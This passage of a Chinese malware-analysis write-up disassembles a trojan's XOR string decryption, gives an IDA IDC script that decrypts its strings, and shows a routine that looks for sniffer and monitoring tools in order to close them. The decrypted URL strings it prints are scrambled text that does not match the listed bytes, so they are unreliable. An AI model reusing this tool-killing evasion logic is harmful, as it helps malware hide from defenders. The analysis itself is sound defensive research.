
`id=1212193&web_id=1212193`这个大概是个网站排名之类的东西，获取点击数。

病毒对字符串进行了简单的xor加密，解密函数如下：

```text
00407759 |> /8B45 EC /mov eax, dword ptr [ebp-14] ; 加解密用密钥“true”的地址移入EAX
0040775C |. |E8 63D5FFFF |call 00404CC4 ; 检测密钥是否存在
00407761 |. |50 |push eax ; 密钥长度4入栈
00407762 |. |8BC3 |mov eax, ebx
00407764 |. |5A |pop edx ; 弹入edx
00407765 |. |8BCA |mov ecx, edx
00407767 |. |99 |cdq ; 将EAX中的字的符号扩展到EDX中
00407768 |. |F7F9 |idiv ecx ; 整数除法
0040776A >|. |8BFA |mov edi, edx ; 余数移入EDI，用作定位密钥数组
0040776C |. |47 |inc edi
0040776D |. |8B45 EC |mov eax, dword ptr [ebp-14] ; 加解密用密钥“true”的地址移入EAX
00407770 |. |0FB64438 FF |movzx eax, byte ptr [eax+edi-1] ; 取具体密钥字符
00407775 |. |B9 0A000000 |mov ecx, 0A ; 固定除数10
0040777A |. |33D2 |xor edx, edx
0040777C |. |F7F1 |div ecx ; 无符号除法，余数放入EDX
0040777E |. |8B45 FC |mov eax, dword ptr [ebp-4] ; 解密数据地址
00407781 |. |0FB64418 FF |movzx eax, byte ptr [eax+ebx-1] ; 解密字节入EAX
00407786 |. |33D0 |xor edx, eax ; 按位异或解密
00407788 |. |8D45 E8 |lea eax, dword ptr [ebp-18]
0040778B |. |E8 80D4FFFF |call 00404C10
00407790 |. |8B55 E8 |mov edx, dword ptr [ebp-18]
00407793 |. |8D45 F0 |lea eax, dword ptr [ebp-10]
00407796 |. |E8 31D5FFFF |call 00404CCC
0040779B |. |43 |inc ebx
0040779C |. |4E |dec esi
0040779D |.^\75 BA \jnz short 00407759
......
```

加密数据如下，通过分析，可知数据结构如下：

```text
Struct EncodeData(
     DWORD  sign;
     DWORD  charLength;
     char   str[];
  )
  .nsp0:00416668 FF FF FF FF 04 00 00 00 dd 0FFFFFFFFh, 4
  .nsp0:00416670 74 72 75 65 00          aTrue\_2 db 'true',0           ; DATA XREF: sub\_4165F0+18o
  .nsp0:00416670                                                       ; sub\_4165F0+3Bo
  .nsp0:00416675 00 00 00                align 4
  .nsp0:00416678 FF FF FF FF 1F 00 00 00 dd 0FFFFFFFFh, 1Fh
  .nsp0:00416680 6C 73 75 76 3E 28 2E 71+aLsuv\_qspOtti\_0 db 'lsuv>(.qsp/ottiiq`ns\*dnk+sk(lsl',0
  .nsp0:00416680 73 70 2F 6F 74 74 69 69+                              ; DATA XREF: sub\_4165F0+1Do
  .nsp0:004166A0 FF FF FF FF 36 00 00 00 dd 0FFFFFFFFh, 36h
  .nsp0:004166A8 6C 73 75 76 3E 28 2E 75+aLsuv\_u04EjGhlW db 'lsuv>(.u04/ej}{(ghl)ws`r\*wiv;ne;55045>2 sbcYmc<76637=4',0
  .nsp0:004166A8 30 34 2F 65 6A 7D 7B 28+                              ; DATA XREF: sub\_4165F0+40o
  .nsp0:004166DF 00                      align 10h
```

运用IDA的脚本功能解密结果如下：

```text
  .nsp0:00416668 FF FF FF FF 04 00 00 00 dd 0FFFFFFFFh, 4
  .nsp0:00416670 74 72 75 65 00          aTrue\_2 db 'true',0           ; DATA XREF: sub\_4165F0+18o
  .nsp0:00416670                                                       ; sub\_4165F0+3Bo
  .nsp0:00416675 00 00 00                align 4
  .nsp0:00416678 FF FF FF FF 1F 00 00 00 dd 0FFFFFFFFh, 1Fh
  .nsp0:00416680 68 74 74 70 3A 2F 2F 77+aLsuv\_qspOtti\_0 db '6feK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3W2H3M7$3S2G2N6h3N6G2N6g2)9J5k6h3y4G2L8g2)9J5c8Y4c8B7i4K6u0W2K9s2c8E0i4K6t1%4i4K6u0o6x3l9`.`.
  .nsp0:00416680 77 77 2E 69 70 73 68 6F+                              ; DATA XREF: sub\_4165F0+1Do
  .nsp0:004166A0 FF FF FF FF 36 00 00 00 dd 0FFFFFFFFh, 36h
  .nsp0:004166A8 68 74 74 70 3A 2F 2F 73+aLsuv\_u04EjGhlW db 'cb3K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4x3@1x3#2)9J5k6h3y4F1P5Y4A6Q4x3X3g2U0L8$3#2Q4x3V1k6K6N6r3q4@1i4K6u0W2M7r3S2H3i4K6y4r3K9h3c8Q4x3@1b7I4x3U0p5J5x3e0V1K6i4K6t1$3N6$3g2T1i4K6g2X3K9h3c8Q4x3@1b7I4x3U0p5J5x3e0V1K6i4K6t1%4i4K6u0o6x3l9`.`.
  .nsp0:004166A8 34 33 2E 63 6E 7A 7A 2E+                              ; DATA XREF: sub\_4165F0+40o
  .nsp0:004166DF 00                      align 10h
```

解密IDC如下：

```text
#include <idc.idc>

static decrypt(from,size,key1,key2)
{
auto i,x,y,m,n,base;
base =0x00416670;

for(i=1;i<=size;i=i+1)
{
y=i%key1;
Message("y = %x \n",y);
m=Byte(base+y);
Message("m = %x \n",m);
n=m%key2;
Message("n = %x \n",n);
x=Byte(from);
n=(n^x);
Message("x = %x \n",x);
PatchByte(from,n);
from=from+1;
}
}
```

## 2.6 枚举所有窗口，关闭一些网络监控、嗅探软件等

```text
004080EC /$ 53 push ebx
004080ED |. 56 push esi
004080EE |. 8B1D 002B4300 mov ebx, dword ptr [432B00] ; TXPlatf0.004336EC
004080F4 |. 33F6 xor esi, esi
004080F6 |. 8BC3 mov eax, ebx
004080F8 |. E8 2BC9FFFF call 00404A28
004080FD |. 6A 00 push 0 ; /lParam = 0
004080FF |. 68 14804000 push 00408014 ; |Callback = TXPlatf0.00408014
00408104 |. E8 57EEFFFF call <jmp.&USER32.EnumWindows> ; \EnumWindows
00408109 |. 8B13 mov edx, dword ptr [ebx]
0040810B |. B8 40824000 mov eax, 00408240 ; ASCII "Winsock Expert"
00408110 |. E8 97CEFFFF call 00404FAC
00408115 |. 85C0 test eax, eax
00408117 |. 0F85 04010000 jnz 00408221
0040811D |. 8B13 mov edx, dword ptr [ebx]
0040811F |. B8 58824000 mov eax, 00408258 ; ASCII "ComnView"
00408124 |. E8 83CEFFFF call 00404FAC
00408129 |. 85C0 test eax, eax
0040812B |. 0F85 F0000000 jnz 00408221
00408131 |. 8B13 mov edx, dword ptr [ebx]
00408133 |. B8 6C824000 mov eax, 0040826C ; ASCII "Outpost"
00408138 |. E8 6FCEFFFF call 00404FAC
0040813D |. 85C0 test eax, eax
0040813F |. 0F85 DC000000 jnz 00408221
00408145 |. 8B13 mov edx, dword ptr [ebx]
00408147 |. B8 7C824000 mov eax, 0040827C ; ASCII "MiniSniffer"
0040814C |. E8 5BCEFFFF call 00404FAC
00408151 |. 85C0 test eax, eax
00408153 |. 0F85 C8000000 jnz 00408221
00408159 |. 8B13 mov edx, dword ptr [ebx]
0040815B |. B8 90824000 mov eax, 00408290 ; ASCII "SmartSniff"
00408160 |. E8 47CEFFFF call 00404FAC
00408165 |. 85C0 test eax, eax
00408167 |. 0F85 B4000000 jnz 00408221
0040816D |. 8B13 mov edx, dword ptr [ebx]
0040816F |. B8 A4824000 mov eax, 004082A4 ; ASCII "Sniffer"
00408174 |. E8 33CEFFFF call 00404FAC
00408179 |. 85C0 test eax, eax
0040817B |. 0F85 A0000000 jnz 00408221
00408181 |. 8B13 mov edx, dword ptr [ebx]
00408183 |. B8 B4824000 mov eax, 004082B4 ; ASCII "Sniff"
00408188 |. E8 1FCEFFFF call 00404FAC
0040818D |. 85C0 test eax, eax
0040818F |. 0F85 8C000000 jnz 00408221
00408195 |. 8B13 mov edx, dword ptr [ebx]
00408197 |. B8 C4824000 mov eax, 004082C4 ; ASCII "CaptureNet"
0040819C |. E8 0BCEFFFF call 00404FAC
004081A1 |. 85C0 test eax, eax
004081A3 |. 75 7C jnz short 00408221
004081A5 |. 8B13 mov edx, dword ptr [ebx]
004081A7 |. B8 D8824000 mov eax, 004082D8 ; ASCII "PeepNet"
004081AC |. E8 FBCDFFFF call 00404FAC
004081B1 |. 85C0 test eax, eax
004081B3 |. 75 6C jnz short 00408221
004081B5 |. 8B13 mov edx, dword ptr [ebx]
004081B7 |. B8 E8824000 mov eax, 004082E8 ; ASCII "spynet"
004081BC |. E8 EBCDFFFF call 00404FAC
004081C1 |. 85C0 test eax, eax
004081C3 |. 75 5C jnz short 00408221
004081C5 |. 8B13 mov edx, dword ptr [ebx]
004081C7 |. B8 F8824000 mov eax, 004082F8 ; ASCII "Dsniff"
004081CC |. E8 DBCDFFFF call 00404FAC
004081D1 |. 85C0 test eax, eax
004081D3 |. 75 4C jnz short 00408221
004081D5 |. 8B13 mov edx, dword ptr [ebx]
004081D7 |. B8 08834000 mov eax, 00408308 ; 嗅探
004081DC |. E8 CBCDFFFF call 00404FAC
004081E1 |. 85C0 test eax, eax
004081E3 |. 75 3C jnz short 00408221
004081E5 |. 8B13 mov edx, dword ptr [ebx]
004081E7 |. B8 18834000 mov eax, 00408318 ; 下载者监视器
004081EC |. E8 BBCDFFFF call 00404FAC
004081F1 |. 85C0 test eax, eax
004081F3 |. 75 2C jnz short 00408221
004081F5 |. 8B13 mov edx, dword ptr [ebx]
004081F7 |. B8 30834000 mov eax, 00408330 ; 下载拦截者
004081FC |. E8 ABCDFFFF call 00404FAC
00408201 |. 85C0 test eax, eax
00408203 |. 75 1C jnz short 00408221
00408205 |. 8B13 mov edx, dword ptr [ebx]
00408207 |. B8 44834000 mov eax, 00408344 ; 抓包
0040820C |. E8 9BCDFFFF call 00404FAC
00408211 |. 85C0 test eax, eax
00408213 |. 75 0C jnz short 00408221
00408215 |. E8 72FEFFFF call 0040808C
0040821A |. 85C0 test eax, eax
0040821C |. 75 03 jnz short 00408221
```
